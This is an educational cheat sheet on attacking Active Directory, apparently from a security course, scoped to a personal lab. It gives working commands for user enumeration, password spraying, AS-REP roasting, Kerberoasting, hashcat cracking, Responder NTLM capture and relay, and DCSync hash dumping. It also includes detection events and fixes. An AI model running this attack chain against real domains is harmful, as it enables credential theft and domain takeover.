# AD Enumeration & Credential Abuse

> **⚠️ AUTHORIZED USE ONLY.** For education and authorized testing only. Every command here targets a live domain and its credentials. Run them only against a lab you built or a domain explicitly in scope for an authorized engagement. Roasting, DCSync, and credential capture are real attacks that trigger real alerts and can lock out accounts. The lab in this sheet targets a Windows Server VM you control. See the [Legal and Terms of Use](/legal) page.

> "Enumeration is where every successful Active Directory attack begins."

**Scope:** The reconnaissance and credential-abuse phase of an AD engagement, run from Kali against a domain. Enumerating users, groups, computers, trusts, and permissions over LDAP and SMB, then the credential attacks that follow: AS-REP Roasting, Kerberoasting, cracking with hashcat, NTLM capture with Responder, and DCSync. Builds on **Active Directory Fundamentals**, which covers the concepts and vocabulary assumed here.

**Recommended background:** the AD Fundamentals sheet (domains, DCs, LDAP, Kerberos, groups), and comfort in a Linux shell. This sheet assumes you know what a TGT and a DN are.

## Table of Contents
- [The Enumeration Mindset](#the-enumeration-mindset)
- [Setting Up the Attack Host](#setting-up-the-attack-host)
- [Enumeration Without Credentials](#enumeration-without-credentials)
- [Enumeration With Credentials](#enumeration-with-credentials)
- [LDAP Enumeration](#ldap-enumeration)
- [Enumerating Users, Groups, and Computers](#enumerating-users-groups-and-computers)
- [Finding the Weak Spots](#finding-the-weak-spots)
- [The Credential Attack Chain](#the-credential-attack-chain)
- [AS-REP Roasting](#as-rep-roasting)
- [Kerberoasting](#kerberoasting)
- [Cracking with Hashcat](#cracking-with-hashcat)
- [NTLM Capture with Responder](#ntlm-capture-with-responder)
- [DCSync](#dcsync)
- [Lab: Enumerate to Domain Compromise](#lab-enumerate-to-domain-compromise)
- [What the Defender Sees](#what-the-defender-sees)
- [Fast Recall](#fast-recall)
- [Resources](#resources)

## 1. The Enumeration Mindset

Enumeration is the first thing an attacker does after landing in a domain, and it is where most of the work happens. Exploitation is often a single command; finding the thing worth exploiting is the effort.

The reason it is so productive was established in the Fundamentals sheet: **any authenticated domain user can read most of the directory over LDAP by default.** A single low-privileged account, phished or found on an exposed service, is enough to map the entire domain: every user, group, computer, trust, and most attributes. You are not breaking in to enumerate; you are reading what the directory hands out.

**What you are looking for:**

| Target | Why |
|--------|-----|
| **Users** | Naming conventions, service accounts, disabled and stale accounts |
| **Groups** | Who is privileged, and the nested paths to privilege |
| **Computers** | Servers, especially DCs, and their OS versions |
| **Trusts** | Paths into other domains |
| **Descriptions** | Passwords and hints administrators leave in attribute fields |
| **Misconfigurations** | The specific flaws that become the credential attacks below |

**The same data serves defence.** Everything you enumerate as an attacker is what a defender should audit: the over-privileged account, the roastable service account, the password in a description field. Enumeration is not inherently offensive, it is understanding the domain, and both sides need it.

## 2. Setting Up the Attack Host

The tools this sheet uses, on Kali. Most are preinstalled; these commands confirm or install them.

```bash
# Impacket: the core toolkit for AD attacks from Linux
pipx install impacket          # or: sudo apt install python3-impacket

# LDAP query tools
sudo apt install ldap-utils    # provides ldapsearch

# NetExec (the maintained successor to CrackMapExec), a Swiss-army enumerator
pipx install netexec           # command is: nxc

# Responder, for NTLM capture
sudo apt install responder

# hashcat, for cracking
sudo apt install hashcat

# BloodHound collector, covered in its own sheet
pipx install bloodhound-ce
```

Two things that save hours of confusion:

**Set the DC as your DNS server.** AD depends on DNS, and Kerberos will not work if your host cannot resolve domain names to the DC.

```bash
# point resolution at the domain controller
echo "nameserver <DC_IP>" | sudo tee /etc/resolv.conf
```

**Kerberos is time-sensitive.** Tickets are rejected if your clock differs from the DC by more than five minutes. Sync to the DC:

```bash
sudo ntpdate <DC_IP>        # or: sudo rdate -n <DC_IP>
```

A `KRB_AP_ERR_SKEW` error means exactly this, and it is the single most common reason a correct Kerberos command fails.

## 3. Enumeration Without Credentials

Before you have any account, a surprising amount is still reachable.

```bash
# what SMB tells you: hostname, domain, OS, signing status
nxc smb <DC_IP>

# enumerate users by guessing RIDs over a null session (often works)
nxc smb <DC_IP> -u '' -p '' --rid-brute

# anonymous LDAP bind, disabled by default but worth checking
ldapsearch -x -H ldap://<DC_IP> -s base namingcontexts

# SMB shares readable anonymously
nxc smb <DC_IP> -u '' -p '' --shares
```

The RID brute is the useful one. Even without credentials, a null session frequently lets you enumerate every account by walking Relative IDs, which gives you a username list to attack.

**Guessing the domain and DC:**

```bash
# reverse lookup and service records
nslookup <DC_IP>
dig SRV _ldap._tcp.dc._msdcs.<domain>
```

## 4. Enumeration With Credentials

Once you have any valid account, the domain opens up. This is the normal starting point for an assessment: an assumed breach with one low-privileged user.

Set variables so the commands below stay readable:

```bash
export DC=10.0.0.10
export DOMAIN=corp.local
export USER=student
export PASS='Str0ngPass!2026'
```

**NetExec is the fastest first pass.** It authenticates and enumerates in one command:

```bash
nxc smb $DC -u $USER -p $PASS                    # confirm the credentials work
nxc smb $DC -u $USER -p $PASS --users            # all domain users
nxc smb $DC -u $USER -p $PASS --groups           # all groups
nxc smb $DC -u $USER -p $PASS --shares           # readable shares
nxc smb $DC -u $USER -p $PASS --pass-pol         # password policy
nxc ldap $DC -u $USER -p $PASS --trusted-for-delegation   # delegation issues
```

A green `[+]` with `(Pwn3d!)` after it means that account is local admin on the target, which is a finding in itself.

## 5. LDAP Enumeration

LDAP is the richest channel, because it exposes the raw directory. `ldapsearch` is the built-in tool.

The anatomy of a query, from the Fundamentals sheet:

```bash
ldapsearch -x -H ldap://$DC \
  -D "$USER@$DOMAIN" -w "$PASS" \
  -b "DC=corp,DC=local" \
  "(objectClass=user)" sAMAccountName
```

| Flag | Meaning |
|------|---------|
| `-x` | Simple authentication |
| `-H` | The LDAP server URL |
| `-D` | The bind identity (who you are) |
| `-w` | The password |
| `-b` | Base DN, where to start searching |
| `"(filter)"` | What to match |
| trailing names | Attributes to return |

**The queries that matter**, each targeting something specific:

```bash
# all users, names only
ldapsearch -x -H ldap://$DC -D "$USER@$DOMAIN" -w "$PASS" \
  -b "DC=corp,DC=local" "(objectClass=user)" sAMAccountName

# members of Domain Admins
ldapsearch -x -H ldap://$DC -D "$USER@$DOMAIN" -w "$PASS" \
  -b "DC=corp,DC=local" "(memberOf=CN=Domain Admins,CN=Users,DC=corp,DC=local)" sAMAccountName

# accounts with Kerberos pre-auth disabled  (AS-REP roastable)
ldapsearch -x -H ldap://$DC -D "$USER@$DOMAIN" -w "$PASS" \
  -b "DC=corp,DC=local" "(userAccountControl:1.2.840.113556.1.4.803:=4194304)" sAMAccountName

# service accounts  (Kerberoastable: they have an SPN)
ldapsearch -x -H ldap://$DC -D "$USER@$DOMAIN" -w "$PASS" \
  -b "DC=corp,DC=local" "(servicePrincipalName=*)" sAMAccountName servicePrincipalName

# passwords hidden in description fields
ldapsearch -x -H ldap://$DC -D "$USER@$DOMAIN" -w "$PASS" \
  -b "DC=corp,DC=local" "(objectClass=user)" sAMAccountName description
```

Those two `userAccountControl` and `servicePrincipalName` filters are not arbitrary. **They find the exact accounts that the AS-REP Roasting and Kerberoasting attacks later in this sheet target.** Enumeration and exploitation are the same query, one step apart.

The `1.2.840.113556.1.4.803` in the pre-auth filter is a **bitwise LDAP matching rule**, checking whether a specific flag is set in `userAccountControl`. `4194304` is the "don't require pre-auth" bit. You do not need to memorize the number, only recognize that this filter finds AS-REP-roastable accounts.

## 6. Enumerating Users, Groups, and Computers

`windapsearch` and NetExec wrap the raw LDAP into friendlier output.

```bash
# every user, cleanly
windapsearch -d $DOMAIN --dc-ip $DC -u "$USER@$DOMAIN" -p "$PASS" -U

# every group
windapsearch -d $DOMAIN --dc-ip $DC -u "$USER@$DOMAIN" -p "$PASS" -G

# members of the privileged groups, expanding nested membership
windapsearch -d $DOMAIN --dc-ip $DC -u "$USER@$DOMAIN" -p "$PASS" \
  --da           # Domain Admins, resolved through nesting

# computers, with OS
windapsearch -d $DOMAIN --dc-ip $DC -u "$USER@$DOMAIN" -p "$PASS" -C
```

**Impacket's `GetADUsers` and NetExec both list users**, so use whichever is to hand:

```bash
GetADUsers.py -all -dc-ip $DC "$DOMAIN/$USER:$PASS"
```

**Enumerating trusts**, the paths into other domains from the Fundamentals sheet:

```bash
nxc ldap $DC -u $USER -p $PASS -M enum_trusts
```

**What to actually read in the output:**

| Look for | Because |
|----------|---------|
| Service accounts (`svc_`, `sql_`, `-svc`) | Often Kerberoastable and often over-privileged |
| Accounts with old `pwdLastSet` | Stale, weak passwords, forgotten |
| Descriptions with any text | Passwords and onboarding notes |
| Nested membership reaching admin groups | The escalation path |
| `Server Operators`, `Backup Operators` members | Near-admin power that people forget |

## 7. Finding the Weak Spots

Enumeration exists to surface these. Each maps to an attack in the next sections.

| Misconfiguration | Attack it enables |
|------------------|-------------------|
| Account with pre-auth disabled | **AS-REP Roasting** |
| User account with an SPN | **Kerberoasting** |
| Password in a `description` attribute | Direct login, no cracking |
| Reused local admin password across machines | Lateral movement (pass-the-hash) |
| Excessive rights (`DS-Replication-Get-Changes`) | **DCSync** |
| SMB signing disabled | **NTLM relay** with captured hashes |
| Unconstrained or constrained delegation | Ticket abuse, privilege escalation |
| Weak password policy | Password spraying |

**Password spraying** deserves a note, because it is often the first move with a user list and no password:

```bash
# ONE password against MANY users, to avoid lockout
nxc smb $DC -u users.txt -p 'Winter2026!' --continue-on-success
```

Spray one password across all users, not many passwords against one, because the second locks accounts out and alerts everyone. Always check the lockout policy (`--pass-pol`) first.

## 8. The Credential Attack Chain

The attacks below are not a menu, they are a sequence that builds on itself. This is the chain real engagements follow.

```text
One low-priv user (assumed breach)
      ↓
Enumerate: find roastable accounts and misconfigurations
      ↓
AS-REP Roast  →  crack  →  more accounts, no auth even needed
      ↓
Kerberoast    →  crack  →  service account credentials, often privileged
      ↓
Use recovered creds to reach a higher-privileged account
      ↓
DCSync with replication rights  →  every hash in the domain
      ↓
Domain compromise
```

Each step feeds the next. A cracked service account may have the replication rights that make DCSync possible, and DCSync ends the game by handing you every credential, including the domain administrator and the `krbtgt` account.

## 9. AS-REP Roasting

**What it is:** some accounts have "do not require Kerberos pre-authentication" set. For those accounts, the DC will hand out an encrypted blob (the AS-REP) to **anyone who asks**, no password required. That blob is encrypted with the account's password, so you take it offline and crack it.

**Why it exists:** pre-authentication was added specifically to stop this. When it is disabled, usually for an old application that could not handle it, the protection is gone.

```bash
# find and roast every pre-auth-disabled account at once
GetNPUsers.py -dc-ip $DC "$DOMAIN/" -usersfile users.txt -no-pass -format hashcat -outputfile asrep.txt

# with valid creds, it finds them itself
GetNPUsers.py -dc-ip $DC "$DOMAIN/$USER:$PASS" -request -format hashcat -outputfile asrep.txt
```

The output is a hash beginning `$krb5asrep$`. Crack it in Section 11.

**The key property: you need no valid credentials for the version with a user list.** AS-REP Roasting can be the very first attack, run against nothing but a list of usernames from a null-session RID brute.

## 10. Kerberoasting

**What it is:** any account with a **Service Principal Name (SPN)** can have a service ticket requested for it by any authenticated user. That ticket is encrypted with the service account's password hash. Request it, extract it, crack it offline.

**Why it works:** requesting a service ticket is completely normal Kerberos behaviour, so the request itself raises no alarm. Service accounts also tend to have old, weak, human-set passwords and are frequently over-privileged, which makes them a high-value target.

```bash
# request tickets for every account with an SPN
GetUserSPNs.py -dc-ip $DC "$DOMAIN/$USER:$PASS" -request -outputfile kerb.txt

# just list the roastable accounts first, without requesting
GetUserSPNs.py -dc-ip $DC "$DOMAIN/$USER:$PASS"
```

The output is a hash beginning `$krb5tgs$`. Crack it in Section 11.

**AS-REP vs Kerberoast, the distinction to keep straight:**

| | AS-REP Roasting | Kerberoasting |
|---|-----------------|---------------|
| Targets | Accounts with pre-auth disabled | Accounts with an SPN |
| Credentials needed | None (with a user list) | Any valid domain account |
| Hash prefix | `$krb5asrep$` | `$krb5tgs$` |
| Typical victim | Legacy user accounts | Service accounts |

## 11. Cracking with Hashcat

Both roasting attacks give you a hash to crack offline. Hashcat needs the right **mode number** for each.

```bash
# AS-REP hash  ($krb5asrep$)
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt

# Kerberoast hash  ($krb5tgs$)
hashcat -m 13100 kerb.txt /usr/share/wordlists/rockyou.txt

# NTLM hash (from a dump)
hashcat -m 1000 ntlm.txt /usr/share/wordlists/rockyou.txt

# add rules to catch password mutations
hashcat -m 13100 kerb.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

| Hash | Mode |
|------|------|
| AS-REP (`$krb5asrep$`) | `18200` |
| Kerberoast (`$krb5tgs$`) | `13100` |
| NTLM | `1000` |
| NetNTLMv2 (from Responder) | `5600` |

Check progress and results:

```bash
hashcat -m 13100 kerb.txt rockyou.txt --show     # show already-cracked hashes
```

**Why offline cracking works and matters:** the DC never sees your guessing. You extracted the encrypted material once, and every guess afterward happens on your machine, so there is no lockout, no rate limit, and no log entry per attempt. This is why weak service-account passwords are so dangerous: they face unlimited offline guessing.

## 12. NTLM Capture with Responder

**What it is:** Windows machines, when they cannot resolve a name normally, fall back to broadcast protocols (LLMNR, NBT-NS, mDNS) and will happily send authentication to whoever answers. Responder answers, and captures the NetNTLMv2 hash the victim offers.

```bash
# listen and poison name-resolution requests on your interface
sudo responder -I eth0

# captured hashes are saved automatically
ls /usr/share/responder/logs/
```

A typical trigger is a user mistyping a share name, or a scheduled task looking for a host that no longer exists. Responder claims to be that host, and the victim authenticates to it.

The captured hash is **NetNTLMv2**, hashcat mode `5600`:

```bash
hashcat -m 5600 /usr/share/responder/logs/hash.txt /usr/share/wordlists/rockyou.txt
```

**Relaying instead of cracking:** if the captured hash belongs to an account that is admin somewhere, and SMB signing is disabled on the target, you can **relay** the authentication straight to that target instead of cracking it, with `ntlmrelayx.py`. That turns a captured hash into immediate access with no password ever recovered. SMB signing is the control that stops it, which is why you enumerated signing status back in Section 3.

## 13. DCSync

**What it is:** domain controllers replicate directory changes to each other using a protocol that includes password data. An account with the **replication rights** (`DS-Replication-Get-Changes` and `-All`) can *ask* a DC to replicate, and thereby pull the password hashes of any account, without ever touching the DC's disk or running code on it.

**Why it is the endgame:** it hands you every hash in the domain, including the domain administrator and, critically, the **`krbtgt`** account. The `krbtgt` hash lets you forge Kerberos tickets for anyone (a Golden Ticket), which is persistent, total domain control.

```bash
# dump a single account
secretsdump.py -dc-ip $DC "$DOMAIN/$USER:$PASS@$DC" -just-dc-user Administrator

# dump every hash in the domain
secretsdump.py -dc-ip $DC "$DOMAIN/$USER:$PASS@$DC" -just-dc

# with an NT hash instead of a password (pass-the-hash)
secretsdump.py -dc-ip $DC -hashes :$NTHASH "$DOMAIN/$USER@$DC" -just-dc
```

The output is `user:rid:lmhash:nthash:::`. The NT hash is what you crack, or what you reuse directly:

```text
Administrator:500:aad3b435...:8846f7eaee8fb117ad06bdd830b7586c:::
krbtgt:502:aad3b435...:<the golden ticket key>:::
```

**Who can do this:** by default, Domain Admins and Domain Controllers. The danger is when the replication rights are **delegated to a non-obvious account** by mistake, which enumeration finds. A cracked service account with those rights is a straight line to the whole domain, which is exactly why the chain in Section 8 ends here.

**Pass-the-hash:** note you never needed to crack the Administrator hash. An NT hash can often be used directly to authenticate, so `secretsdump` output is frequently the end of the engagement rather than the start of a cracking session.

## 14. Lab: Enumerate to Domain Compromise

**What you are doing:** running the full chain against the lab domain, from one low-privileged user to a domain hash dump. **This targets the Windows Server VM you built for this project.**

**Time:** about 45 minutes. **Prerequisites:** the three-VM lab from the project (Kali, Windows Server DC, Windows 11), all on the same network, with the `student` account provided.

### Step 1: Prepare Kali

```bash
export DC=<your DC IP>
export DOMAIN=corp.local            # use your lab's actual domain
export USER=student
export PASS='Str0ngPass!2026'

# DNS and time, the two things that break Kerberos
echo "nameserver $DC" | sudo tee /etc/resolv.conf
sudo ntpdate $DC
```

### Step 2: Confirm the credentials and get the lay of the land

```bash
nxc smb $DC -u $USER -p $PASS
nxc smb $DC -u $USER -p $PASS --users | tee users_raw.txt
nxc smb $DC -u $USER -p $PASS --pass-pol
```

Expected: a `[+]` authentication success and a list of users. Note the lockout threshold from the policy, so you know how careful to be.

### Step 3: Build a clean user list

```bash
# extract just the usernames for the roasting tools
nxc smb $DC -u $USER -p $PASS --users | awk '{print $5}' | grep -v '^$' > users.txt
wc -l users.txt
```

### Step 4: AS-REP Roast

```bash
GetNPUsers.py -dc-ip $DC "$DOMAIN/$USER:$PASS" -request -format hashcat -outputfile asrep.txt
cat asrep.txt
```

If any account has pre-auth disabled, you get a `$krb5asrep$` hash. If not, the tool says so, which is also a valid result.

### Step 5: Kerberoast

```bash
GetUserSPNs.py -dc-ip $DC "$DOMAIN/$USER:$PASS" -request -outputfile kerb.txt
cat kerb.txt
```

Expected: one or more `$krb5tgs$` hashes for the lab's service accounts.

### Step 6: Crack what you found

```bash
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt    # if you got AS-REP hashes
hashcat -m 13100 kerb.txt  /usr/share/wordlists/rockyou.txt    # the Kerberoast hashes

hashcat -m 13100 kerb.txt --show                                # see the cracked passwords
```

Expected: at least one service-account password recovered. Note it.

### Step 7: Test the recovered credentials

```bash
# does the cracked service account have more access than student?
nxc smb $DC -u <svc_account> -p '<cracked_pass>'
```

Watch for `(Pwn3d!)`, which means local admin on the DC.

### Step 8: DCSync, if the account has the rights

```bash
secretsdump.py -dc-ip $DC "$DOMAIN/<svc_account>:<cracked_pass>@$DC" -just-dc-user Administrator
```

Expected, if the account has replication rights: the Administrator NT hash. That is domain compromise, achieved from a single low-privileged starting account.

### Step 9: Read what you achieved

Trace the path backwards: you started as `student`, enumerated to find a roastable service account, cracked its password offline, and used its rights to pull the domain's hashes. Every step used a documented, normal-looking action. That is what makes the chain effective and hard to spot.

### Cleanup

The hashes and cracked passwords are real for your lab. Delete the working files when done:

```bash
rm -f asrep.txt kerb.txt users.txt users_raw.txt
```

Revert the VM to a snapshot if you want a clean domain for the next sheet.

## 15. What the Defender Sees

Every attack above leaves traces. Knowing them is what the objective means by detecting suspicious activity, and it is what makes this useful beyond the offensive side.

| Attack | Detection signal |
|--------|------------------|
| **LDAP enumeration** | A single account issuing an unusual volume of directory queries |
| **RID brute / null session** | Anonymous SMB sessions, event 4625 patterns |
| **Password spraying** | Many accounts, one failure each, in a short window (event 4625) |
| **AS-REP Roasting** | Kerberos event 4768 with pre-auth type 0, for roastable accounts |
| **Kerberoasting** | Event 4769 (service ticket requested) with RC4 encryption (type 0x17) |
| **Responder / NTLM capture** | Rogue responses to LLMNR and NBT-NS on the network |
| **DCSync** | Event 4662 with the replication GUID, from a non-DC source |

**The highest-value detections:** DCSync from anything that is not a domain controller is almost always malicious, and a spike in RC4 service-ticket requests is the signature of Kerberoasting. Both are specific enough to alert on with low false positives.

**The defensive fixes, mapped to the attacks:**

| Weakness | Fix |
|----------|-----|
| Pre-auth disabled | Re-enable it; it is rarely genuinely needed |
| Weak service-account passwords | Use group Managed Service Accounts (gMSA), which rotate long random passwords |
| Passwords in descriptions | Audit and clear the `description` field |
| LLMNR / NBT-NS | Disable them; they are legacy name resolution |
| SMB signing off | Enforce signing to stop relay |
| Over-broad replication rights | Audit who holds `DS-Replication-Get-Changes` |
| RC4 Kerberos | Enforce AES, which also makes roasted hashes far harder to crack |

## 16. Fast Recall

- **Enumeration is the first move and the bulk of the work.** Any authenticated user can read most of the directory over LDAP by default.
- **Fix DNS and time first.** Point Kali's resolver at the DC, and sync the clock, or Kerberos fails with `KRB_AP_ERR_SKEW`.
- **No creds yet:** null-session RID brute (`nxc smb --rid-brute`) often gives a full user list to attack.
- **With creds, NetExec is the fast first pass:** `--users`, `--groups`, `--shares`, `--pass-pol`. `(Pwn3d!)` means local admin.
- **`ldapsearch`** is the raw channel. The pre-auth filter (`...803:=4194304`) finds AS-REP-roastable accounts; `(servicePrincipalName=*)` finds Kerberoastable ones.
- **Always check `description` fields.** Administrators leave passwords there, and every user can read them.
- **Password spraying:** one password across many users, never the reverse, and check lockout policy first.
- **The chain:** enumerate, AS-REP roast, Kerberoast, crack, escalate, DCSync, domain owned.
- **AS-REP Roasting** targets pre-auth-disabled accounts and needs no credentials with a user list. Hash `$krb5asrep$`, hashcat `18200`.
- **Kerberoasting** targets accounts with an SPN and needs any valid account. Hash `$krb5tgs$`, hashcat `13100`.
- **Offline cracking has no lockout and no per-guess logging**, which is why weak service-account passwords are so dangerous.
- **Responder** captures NetNTLMv2 (hashcat `5600`) by answering LLMNR/NBT-NS. If signing is off, relay instead of crack with `ntlmrelayx.py`.
- **DCSync** uses replication rights to pull every hash, including `krbtgt`, with `secretsdump.py -just-dc`. No code runs on the DC.
- **Pass-the-hash:** an NT hash often authenticates directly, so you may never need to crack it.
- **Detection:** DCSync from a non-DC (event 4662 + replication GUID) and RC4 service-ticket spikes (event 4769) are the highest-fidelity signals.
- **Defences:** gMSA for service accounts, re-enable pre-auth, disable LLMNR, enforce SMB signing and AES, audit replication rights.

## 17. Resources

**Tooling**
- [Impacket (fortra)](https://github.com/fortra/impacket)
- [NetExec (CrackMapExec successor)](https://github.com/Pennyw0rth/NetExec)
- [Responder](https://github.com/lgandx/Responder)
- [hashcat](https://hashcat.net/hashcat/)
- [hashcat mode reference](https://hashcat.net/wiki/doku.php?id=example_hashes)

**Technique references**
- [The Hacker Recipes: Active Directory](https://www.thehacker.recipes/ad/)
- [HackTricks: Active Directory methodology](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology)
- [MITRE ATT&CK: Kerberoasting (T1558.003)](https://attack.mitre.org/techniques/T1558/003/)
- [MITRE ATT&CK: DCSync (T1003.006)](https://attack.mitre.org/techniques/T1003/006/)

**Defence**
- [Microsoft: Securing Active Directory](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/best-practices-for-securing-active-directory)
- [CISA: Detecting and mitigating AD compromises](https://www.cisa.gov/resources-tools/resources/detecting-and-mitigating-active-directory-compromises)

**Building the lab**
- [GOAD: Game of Active Directory](https://github.com/Orange-Cyberdefense/GOAD)
- [Microsoft Evaluation Center](https://www.microsoft.com/en-us/evalcenter/)

**Related sheets**
- Active Directory Fundamentals, for the concepts this builds on
- Active Directory LDAP, for the query protocol in depth
- Active Directory Attack Path Analysis, for BloodHound and PowerView
